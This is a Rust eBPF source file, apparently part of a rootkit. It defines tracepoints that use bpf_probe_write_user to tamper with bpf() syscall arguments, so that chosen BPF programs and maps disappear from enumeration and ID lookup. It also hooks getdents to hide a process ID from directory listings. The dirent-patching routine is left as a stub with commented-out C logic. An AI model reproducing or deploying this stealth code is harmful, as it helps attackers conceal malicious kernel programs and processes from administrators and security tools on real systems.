#![no_std]
#![no_main]

use aya_ebpf::{
    bindings::{bpf_attr, bpf_cmd},
    cty::{c_int, c_void},
    helpers::{bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read, bpf_probe_write_user},
    macros::{map, tracepoint},
    maps::HashMap,
    programs::TracePointContext,
};
use aya_log_ebpf::info;

#[map]
static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
#[map]
static MAP_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
#[map]
static HIDDEN_BPF_OBJ: HashMap<u32, [u32; 32]> = HashMap::<u32, [u32; 32]>::with_max_entries(2, 0);

#[no_mangle]
pub static HIDDEN_PID: u32 = 0;
#[map]
static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(32, 0);

const MAX_DIRENTS: u32 = 500u32;

enum BpfObjType {
    Prog,
    Map,
}
#[inline]
fn update_obj_id(
    obj_type: BpfObjType,
    update_value: u32,
    src_prog_attr: &mut bpf_attr,
    dst_prog_attr: *mut bpf_attr,
) -> Result<u32, u32> {
    match obj_type {
        BpfObjType::Prog => src_prog_attr.__bindgen_anon_6.__bindgen_anon_1.prog_id = update_value,
        BpfObjType::Map => src_prog_attr.__bindgen_anon_6.__bindgen_anon_1.map_id = update_value,
    }
    unsafe {
        bpf_probe_write_user(dst_prog_attr, src_prog_attr as *const bpf_attr).map_err(|_| 0u32)?
    };
    Ok(0)
}

#[tracepoint]
fn stealth_bpf(ctx: TracePointContext) -> Result<u32, u32> {
    let cmd: u32 = unsafe { ctx.read_at(16).map_err(|_| 0u32)? };
    let mut_attr: *mut bpf_attr = unsafe { ctx.read_at(24).map_err(|_| 0u32)? };
    let mut attr_cpy: bpf_attr = unsafe { bpf_probe_read(mut_attr).map_err(|_| 1u32)? };
    match cmd {
        bpf_cmd::BPF_PROG_GET_NEXT_ID => {
            let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };
            if let Some(skip_id) = unsafe { PROG_SKIP.get(&prog_id) } {
                update_obj_id(BpfObjType::Prog, *skip_id, &mut attr_cpy, mut_attr)?;
                //info!(&ctx, "prog: {} -> {}", prog_id, *skip_id);
            }
        }
        bpf_cmd::BPF_MAP_GET_NEXT_ID => {
            let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };
            if let Some(skip_id) = unsafe { MAP_SKIP.get(&map_id) } {
                update_obj_id(BpfObjType::Map, *skip_id, &mut attr_cpy, mut_attr)?;
                //info!(&ctx, "map: {} -> {}", map_id, *skip_id);
            }
        }
        bpf_cmd::BPF_PROG_GET_FD_BY_ID => {
            let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };

            if let Some(hidden_progs) = unsafe { HIDDEN_BPF_OBJ.get(&0) } {
                if hidden_progs.contains(&prog_id) {
                    update_obj_id(BpfObjType::Prog, u32::MAX, &mut attr_cpy, mut_attr)?;
                    //info!(&ctx, "prog: {}-> max", prog_id);
                }
            }
        }
        bpf_cmd::BPF_MAP_GET_FD_BY_ID => {
            let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };

            if let Some(hidden_maps) = unsafe { HIDDEN_BPF_OBJ.get(&1) } {
                if hidden_maps.contains(&map_id) {
                    update_obj_id(BpfObjType::Map, u32::MAX, &mut attr_cpy, mut_attr)?;
                    //info!(&ctx, "map: {} -> max", map_id);
                }
            }
        }
        _ => {}
    };
    Ok(0)
}

#[tracepoint]
pub fn stealth_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let dirents_buf_addr = unsafe { ctx.read_at::<u64>(24).map_err(|_| 1u32)? };
    PID_DIRENTS
        .insert(&caller_pid, &dirents_buf_addr, 0)
        .map_err(|_| 1u32)?;
    Ok(0)
}

#[repr(C)]
#[derive(Default)]
pub struct __IncompleteArrayField<T>(::core::marker::PhantomData<T>, [T; 0]);
impl<T> __IncompleteArrayField<T> {
    #[inline]
    pub const fn new() -> Self {
        __IncompleteArrayField(::core::marker::PhantomData, [])
    }
    #[inline]
    pub fn as_ptr(&self) -> *const T {
        self as *const _ as *const T
    }
    #[inline]
    pub fn as_mut_ptr(&mut self) -> *mut T {
        self as *mut _ as *mut T
    }
    #[inline]
    pub unsafe fn as_slice(&self, len: usize) -> &[T] {
        ::core::slice::from_raw_parts(self.as_ptr(), len)
    }
    #[inline]
    pub unsafe fn as_mut_slice(&mut self, len: usize) -> &mut [T] {
        ::core::slice::from_raw_parts_mut(self.as_mut_ptr(), len)
    }
}
impl<T> ::core::fmt::Debug for __IncompleteArrayField<T> {
    fn fmt(&self, fmt: &mut ::core::fmt::Formatter<'_>) -> ::core::fmt::Result {
        fmt.write_str("__IncompleteArrayField")
    }
}
pub type __s64 = ::aya_ebpf::cty::c_longlong;
pub type __u64 = ::aya_ebpf::cty::c_ulonglong;
pub type s64 = __s64;
pub type u64_ = __u64;
#[repr(C)]
#[derive(Debug)]
pub struct linux_dirent64 {
    pub d_ino: u64_,
    pub d_off: s64,
    pub d_reclen: ::aya_ebpf::cty::c_ushort,
    pub d_type: ::aya_ebpf::cty::c_uchar,
    pub d_name: __IncompleteArrayField<::aya_ebpf::cty::c_char>,
}

#[repr(C)]
struct DirentData<'a> {
    ctx: &'a TracePointContext,
    bpos: u64,
    max_offset: u64,
    dirents_buf_addr: u64,
    d_reclen: u32,
    d_reclen_prev: u32,
}

#[inline]
unsafe fn patch_dirent_if_found(ctx: *mut c_void) -> c_int {
    let direntdata = ctx as *mut DirentData;
    info!((*direntdata).ctx, "inside!");
    //    if(is_end_of_buff(data->bpos, data->buff_size)) return 1;

    //    u8 dirname[MAX_NAME_LEN];
    //    struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);

    //    read_user__reclen(&data->d_reclen, &dirent->d_reclen);
    //    read_user__dirname(dirname, dirent->d_name);

    //    struct userspace_data * userspace_data = data->userspace_data;

    //    int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);

    //    if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
    //       data->patch_succeded = remove_curr_dirent(data);
    //       return 1;
    //    }

    //    data->d_reclen_prev = data->d_reclen;
    //    data->bpos += data->d_reclen;
    0
}
#[tracepoint]
pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
    let hidden_pid: u32 = unsafe { core::ptr::read_volatile(&HIDDEN_PID) };
    let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;

    let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
    let dirents_buf_addr = *unsafe { PID_DIRENTS.get(&caller_pid) }.ok_or(1u32)?;
    let mut dirent_data = DirentData {
        ctx: &ctx,
        bpos: 0,
        max_offset: max_offset,
        dirents_buf_addr: dirents_buf_addr,
        d_reclen: 0,
        d_reclen_prev: 0,
    };
    unsafe {
        bpf_loop(
            MAX_DIRENTS,
            patch_dirent_if_found as *mut fn(*mut c_void) -> i32 as *mut c_void,
            &mut dirent_data as *mut DirentData as *mut c_void,
            0,
        )
    };
    // let dirent = unsafe { bpf_probe_read(dirent_addr as *const linux_dirent64).map_err(|_| 1u32)? };
    // info!(&ctx, "{}", dirent.d_reclen);

    PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;
    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}

// {
//     if(is_end_of_buff(data->bpos, data->buff_size)) return 1;

//     u8 dirname[MAX_NAME_LEN];
//     struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);

//     read_user__reclen(&data->d_reclen, &dirent->d_reclen);
//     read_user__dirname(dirname, dirent->d_name);

//     struct userspace_data * userspace_data = data->userspace_data;

//     int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);

//     if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
//        data->patch_succeded = remove_curr_dirent(data);
//        return 1;
//     }

//     data->d_reclen_prev = data->d_reclen;
//     data->bpos += data->d_reclen;
//     return 0;
//  }
